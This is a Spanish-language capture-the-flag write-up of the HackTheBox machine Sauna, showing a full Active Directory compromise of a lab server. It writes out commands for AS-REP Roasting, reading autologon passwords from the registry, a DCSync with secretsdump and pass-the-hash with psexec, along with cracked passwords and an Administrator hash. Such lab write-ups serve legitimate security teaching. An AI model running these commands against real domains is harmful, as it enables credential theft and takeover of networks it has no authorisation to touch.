---
title: HTB Sauna Write-up (Español)
tags: [HackTheBox, AS-REP Roasting, Active Direcotory, DCSync]
image: /assets/images/Sauna/1__i__enw5__Rg5ZLLoPDehOMqw.png
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-sauna-write-up-espa%C3%B1ol-67d4d0eff1c6)

Sauna es una máquina basada en Windows que estuvo activa desde el 15 de Febrero del 2020 hasta el 18 de Julio, para resolver esta máquina tendremos que crear una lista de posible usuarios basándonos en la información que encontramos en su página web, a falta de información probaremos si alguno de los supuestos usuarios es susceptible a AS-REP Roasting, tenemos exito consiguiendo un ticket del usuario “fsmith”, crackeamos la contraseña y conseguimos acceso al servidor, luego conseguimos la contraseña del usuario “svc\_loanmgr”, el cual se logea automáticamente al servidor, por lo que la encontramos en el registro de winlogon, por últimos realizamos un DC Sync con este usuario para conseguir el hash de administrador, y nos logeamos como dicho usuario realizando un pass the hash.

# Enumeración

Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.

masscan -e tun0 --rate=500 -p 0–65535 10.10.10.175  
nmap -sC -sV -p 57075,53,464,445,389,49673,80,3269,49686,135,88,9389,139,593,5985,4974,636,3268 -o scan.txt 10.10.10.175

```bash
PORT      STATE    SERVICE       VERSION  
53/tcp    open     domain?  
| fingerprint-strings:   
|   DNSVersionBindReqTCP:   
|     version  
|\_    bind  
80/tcp    open     http          Microsoft IIS httpd 10.0  
| http-methods:   
|\_  Potentially risky methods: TRACE  
|\_http-server-header: Microsoft-IIS/10.0  
|\_http-title: Egotistical Bank :: Home  
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-25 00:05:24Z)  
135/tcp   open     msrpc         Microsoft Windows RPC  
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)  
445/tcp   open     microsoft-ds?  
464/tcp   open     kpasswd5?  
593/tcp   open     ncacn\_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open     tcpwrapped  
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)  
3269/tcp  open     tcpwrapped  
4974/tcp  filtered unknown  
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|\_http-server-header: Microsoft-HTTPAPI/2.0  
|\_http-title: Not Found  
9389/tcp  open     mc-nmf        .NET Message Framing  
49673/tcp open     msrpc         Microsoft Windows RPC  
49686/tcp open     msrpc         Microsoft Windows RPC  
57075/tcp filtered unknown
```

Por el escaneo vemos que es un común Windows server, aunque lo que destaca es tener el puerto 80 abierto, antes de revisarlo revisamos LDAP/RPC. `ldapsearch -x -h 10.10.10.175 -b “DC=EGOTISTICAL-BANK,DC=LOCAL”`

![](/assets/images/Sauna/1__x__NmKW4wMMgo6nL3MU4LLg.png)


No tenemos acceso a los usuarios del servidor, aunque encontramos una unidad organizacional llamada Hugo Smith, la cual podría ser también el nombre de un usuario, ya que no encontramos más información relevante, visitamos la página web.

![](/assets/images/Sauna/1__yMfXep__hqVl8JLFbgIanaQ.png)


La página parece ser la de una especie de banco, aunque no pudimos identificar ninguna vulnerabilidad en ella, lo más relevante lo encontramos en [http://10.10.10.175/about.html](http://10.10.10.175/about.html).

![](/assets/images/Sauna/1__AQDv__cnskT86mFbd0FDAbw.png)


La página tiene una sección de los integrantes de la empresa, una práctica común para crear los usuarios es tomar la primera letra del nombre, el apellido y juntarlos, a veces se pone un punto en medio, así que asumiendo esta posibilidad creamos una lista de posibles usuarios usando [exrex](https://github.com/asciimoo/exrex).

![](/assets/images/Sauna/1__DZUkdHaHhpx3BA4je4T2FA.png)


Así queda nuestra lista.

![](/assets/images/Sauna/1__MCGsVdAo1MTJmrCm0tu7bw.png)


# Ganando acceso

Usamos el módulo “kerberos\_enumusers” de metasploit para validar nuestros usuarios, vemos que “hsmith” existe, y obtenemos un error con el usuario “fsmith”, quitamos este usuario de la lista y lo reintentamos, pero no encontramos otro usuario válido, ahora tenemos 2 usuarios “hsmith” y “fsmith” el cual conservamos ya que no podemos descartarlo debido al error.

![](/assets/images/Sauna/1__yGZAbBPkn5Yw0AE6jP6TDQ.png)


Intentamos adivinar la contraseña de uno de los 2 usuarios con listas pequeñas de contraseñas comunes (usar listas grandes tomaría demasiado tiempo) y las palabras encontradas en el sitio web sin ningún éxito, así que probamos suerte con algunos ataques a AD, en este caso AS-REP Roasting tiene éxito, para hacerlo usamos el script “GetNPUsers.py” de Impacket: `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -u users.txt -dc-ip 10.10.10.175 -format john`

![](/assets/images/Sauna/1__n171AXkEUkcbWY__L63YsxQ.png)


Bien conseguimos un ticket con “fsmith”, procedemos a crackearlo con john y obtenemos que la contraseña es “Thestrokes23”.

![](/assets/images/Sauna/1__5oRGzcOxzTPa3Zh1__9ujag.png)


Nos conectamos al servidor usando evil-wirm y conseguimos el “user.txt”.

![](/assets/images/Sauna/1__OBHLx84VoAMgjTD__vtFzmA.png)


# Movimiento lateral

Como parte de la enumeración subimos y corremos [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) y este nos encuentras unas credenciales de autologon del usuario “svc\_loanmgr”.

![](/assets/images/Sauna/1__Irqga78KAXbLr04fWdML__A.png)


Cuando un usuario se logea automáticamente a una computadora, sus credenciales son guardadas en el registro de windows, estas se pueden recuperar con los comandos:  
`REG QUERY “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” /v DefaultUserName`   
`REG QUERY “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon” /v DefaultPassword`

![](/assets/images/Sauna/1__dDlrV6Jhs659ov4h9XjTVQ.png)


# Escalación de privilegios

Con este nuevo usuario podemos realizar un DC Sync, para esto usamos el script secretsdump.py de Impacket: `python3 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:’Moneymakestheworldgoround!’@10.10.10.175 -dc-ip 10.10.10.175`.

![](/assets/images/Sauna/1__EMqhIESL33O3bMKMNoxR7w.png)


Vemos que conseguimos los hashes LMNT de Administrador “Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::”, no necesitamos crackearlos ya que podemos hacer un pass the hash con ellos: `python3 psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`.

![](/assets/images/Sauna/1__CqlxeJG2lhQs134TW__lg2Q.png)


Y con eso somos authority\\system y conseguimos el “root.txt”.

# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.